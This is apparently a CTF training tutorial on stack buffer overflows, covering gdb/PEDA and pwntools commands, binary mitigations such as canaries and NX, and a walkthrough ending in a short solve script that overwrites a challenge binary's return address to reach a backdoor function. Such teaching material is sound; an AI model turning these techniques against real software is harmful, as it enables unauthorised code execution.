# Pwn Tutorial
## Pwn intro
* Buffer explanation
* Buffer overflow
* Stack (buffer) overflow

### Not covered / For future reading
* Format string exploits
* Heap exploits

## Tools
### Linux commands
Quick and dirty recon of the challenge binary before that actual work starts
* file - can identify what kind of binary it is, commonly ELF 32-bit or ELF 64-bit, often the first thing you do
* readelf - old school way of reading symbols etc of a binary

### Disassembler/Decompiler
Not necessarily needed, but can help you understand the code flow better than reading pure assembly in GDB. Primarily for harder tasks or reversing challenges.
* [IDA Pro/Free/Home](https://www.hex-rays.com/products/ida/) - IDA Pro is the long time industry standard for disassembling/decompiling, but it's expensive for the full version
* [Ghidra](https://ghidra-sre.org/) - Free and open-source tool developed by the NSA, great replacement for IDA. Only real contender to IDA when it comes to decompilation.
* [Binary Ninja](https://binary.ninja/) - Cheaper alternative to IDA, very new and fancy with some cool features. Has a free trial and discount for students.
* [Cutter](https://cutter.re/) - Free and open-source alternative that runs on any operating system. Built on top of r2 which is a super powerful reversing tool and includes the Ghidra decompiler. My personal favorite for a free option.

### Debugger
For testing how the application behaves when given different inputs and what actually happens behind the scenes etc.
* gdb - The one and only tool for debugging on Linux, we will go over the use of gdb more in a live demo. It's a bit old-school but it's made a lot more usable by using one of the following plugins:
  * [PEDA](https://github.com/longld/peda) - PEDA aka Python Exploit Development Assistance is the "old reliable" plugin that's been around for a while and works great (this is what I'm going to be using for my demo)
  * [pwndbg](https://github.com/pwndbg/pwndbg) - the new and modern plugin, does everything PEDA does and more! (this is what I should be using.)

### Coding
How to actually make your exploit!
* Python - Easy to read, easy to write and with great modules for making exploits, you never do a pwn challenge without writing python!
  * [pwntools](https://github.com/Gallopsled/pwntools) - the #1 exploit development module for python, this can do everything you need and automates a lot of the manual labor people needed to do in the olden day. We will use this in a live demo to solve some challenges!

## Command cheatsheets
### gdb
* checksec - PEDA/pwndbg command and your most important tool in gdb when doing pwn challenges. It tells you which modern safety mechanisms are enabled in the program to prevent binary exploitation, the more disabled features the happier we are!
  * CANARY - "stack canary" or "stack cookies" are random values placed on the stack to protect important data, if you overwrite the stack canary with a different value than the expected one the program will exit immediately and you won't get code execution
  * FORTIFY - the most modern and fancy feature, it can automatically check input lengths and detect buffer overflows without relying on stack canaries. This is the only feature that is not enabled by default when compiling with gcc so the developer has to specifically ask for this, making it uncommon to see in random programs.
  * NX - "No eXecute" allows a program to define which sections are *code* that is supposed to be executed and which sections are *data* that just hold random values or user input. This does not prevent buffer overflows, but it prevents us from giving the program assembly/shellcode as string input and being able to execute it.
  * PIE - Position Independent Executable, makes all sections of the program to be loaded at random addresses during startup. This will prevent you from jumping to a function based on it's address unless you have some sort of information leak first.
 * RELRO - "RElocation Read-Only" makes the GOT (Global Offset Table) of a program read only, preventing you from overwriting the function pointers stored there. This can be either disabled, "Full" or "Partial" but the only real problem is full RELRO.
* r(un) - start the program from scratch
* disas(semble) - shows the assembly code at an address/function
  * disas main - show all the code for the function main
  * disas 0x41424344 - show the code at address 0x41424344, not used as much as the above example
* b(reakpoint) - stops execution of the program at a specific adress
  * b 0x41424344 - stops execution at the adress 0x41424344
  * b *main - stops execution at the start of the function main (note the asterisk, it means a pointer in C code)
  * b *main+110 - stops execution at 110 bytes into main, gdb will print the byte number for each line when looking at a disassemble output of any function
* s(tep) - executes the next line of assembly then stops
* n(ext) - executes the next line of assembly, but if it is a function call it will run the entire function before stopping on the next line
* c(ontinue) - continues execution as normal until the next breakpoint or until the program exits
* fin(ish) - continue execution until the current function is done, useful if you accidentally step into a function you meant to step over.
* pattern create NUM - creates a pattern of length NUM that can be used as input, if the program crashes at any part of you input you can find out the offset by using the commands below
  * pattern create 100 # returns a 100bytes long string you can use as input to the program
* pattern offset - find out how many bytes into the pattern a given hex value is
  * pattern offset 0x41414641 # if the program crashed with EIP/RIP/PC 0x41414641 then this will return how many bytes are needed to overwrite EIP/RIP/PC
* pattern search - searches the entire program memory space to find any reference to any part of the pattern,
* x - show the memory content at an address, not needed a lot since PEDA/pwndbg prints all interesting values
  * x $eax - print the content of the register EAX, register name needs to be lower case and prefixed by a dollar sign
  * x 0x41424344 - print the content at the address 0x41424344
  * x/10 0x41424344 - print 10 values starting at address 0x41424344
  * x/s 0x41424344 - print the string located at 0x41424344

### pwntools
* from pwn import * - the prefered way to use pwntools, it's not very python-esque but it's a nice quality of life improvement
* process(programname) - starts a local program on your computer and returns a "tube" object that can communicate directly with the I/O of the program
* io = process("./overflow100")
* remote(adress_in_quotes, portnumber) - connects to a remote service and returns a "tube" object that can communicate directly with the I/O, used when you have a working exploit locally and want to run it against our servers to get your flag!
  * io = remote("overflow100.heltsikker.no", 9000)
* send(bytes) - used on a tube object returned by process() or remote() to send bytes/text as input
  * io.send("Hello world!\n")
  * io.send("\x44\x43\x42\x41") # little endian representation of the value 0x41424344
* sendline(bytes) - used on a a tube object to send bytes/text followed by a newline character (\n), commonly used instead of send() as most applications read user input line by line
  * io.sendline("Hello world!")
* recv() - used on a tube object to read all available output, can be printed or just ignored
  * io.recv() # throw it in the garbage
  * print(io.recv()) # I want to see the program output
* recvline() - used on a tube object to read the input up to and including the next newline character, commonly used together with string.split() or other python functions to parse a line where you expect something interesting to be
  * io.recvline()
* recvuntil(text) - used on a tube object to read input up to and including *text*, commonly used to parse output between some specific words/symbols
  * io.recvuntil("the password is: ") # now io.recvline() or io.recv() should give me JUST the password and nothing else!
* interactive() - used on a tube object so you can write and read text as input directly in your terminal like you're running the program as normally. Good to use if you're starting a shell and want to interact with it personally instead of using sendline/recvline
  * io.interactive() # you can now just write in the terminal as normally and the program will respond
* p32(number) - Packs any number up to 32 bits (2^32) and returns it as bytes in little endian, the format your program 99% of the time expects it to be in.
  * p32(1337) # returns "\x39\x05\x00\x00" because 1337 in decimal is is 0x539 and the lowest byte (0x39) comes first. This is called little endian.
  * p32(0x41424344) # returns "\x44\x43\x42\x41" aka "DCBA"
* u32(bytes) - Unpacks a 32bit byte value into a normal decimal number. Input has to be exactly 4 bytes (32bit)!! Used for information leaks where the program outputs a function adress or similar in raw bytes and you want to read it
  * u32("\x39\x05\x00\x00") # returns 1337
  * u32("\x44\x43\x42\x41") # returns 1094861636 which is the decimal representation of 0x41424344
  * hex(u32("\x44\x43\x42\x41")) # returns "0x41424344"
* p64(number) - Packs any number up to 64 bits (2^64) and returns it as bytes in little endian form.
  * p64(1337) # returns '\x39\x05\x00\x00\x00\x00\x00\x00' because 1337 is 0x539 and the lowest byte (0x39) comes first. This is called little endian.
  * p64(0x4847464544434241) # returns "ABCDEFGH" aka "\x41\x42\x43\x44\x45\x46\x47\x48"
* u64(bytes) - Unpacks a 64bit byte value into a normal number. Input has to be exactly 8 bytes (64bit)!!
  * u64("ABCDEFGH") # returns 5208208757389214273 which is the decimal representation of 0x4847464544434241
  * hex(u64("ABCDEFGH") # returns "0x4847464544434241"
* ELF(programname) - reads your program into an object where you can easily access things like function adresses, if it's 32bit or 64bit, what security measures are enables(what checksec does in gdb) and some other details.
  * binary = ELF("./overflow100")
* ELF.symbols - a dictionary of every symbol(function names) in the program, super useful to jump to a function you know the name of without looking up the address in gdb/readelf/IDA/whatever
  * binary.symbols # returns the full dictionary for your manual inspection
  * binary.symbols["main"] # returns the address of the function *main* in the program
  * p32(binary.symbols["backdoor"]) # packs the address of the function *backdoor* as a 32bit value, ready to be sent to a program

## Live demo
[backdoor binary to solve](backdoor)
### Methodology
The only commands *needed* to solve the challenge, normally you try a couple different things in between as trial and error but this is a *perfect solution*. checksec in gdb was not ran during the demo, but it's recommended to see which safety measures are enabled/disabled! The meaning of the safety measures are described in the gdb cheatsheet above.
``` 
josch@DESKTOP-IHQHF33:~/Documents/hs-ctf-h20/pwn/backdoor/source$ file backdoor
backdoor: ELF 32-bit LSB executable, Intel 80386 *snip*
josch@DESKTOP-IHQHF33:~/Documents/hs-ctf-h20/pwn/backdoor/source$ gdb ./backdoor
*snip*
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
*snip*
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
*snip*
*paste pattern from above*
*snip*
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44
```

### Final solve script
```python
from pwn import *

#io = process("./backdoor")
io = remote("backdoor.heltsikker.no", 9002)

binary = ELF("./backdoor")

padding = b"A" * 44
target = p32(binary.symbols["backdoor"])

print(padding + target)
io.sendline(padding + target)

io.interactive()
```
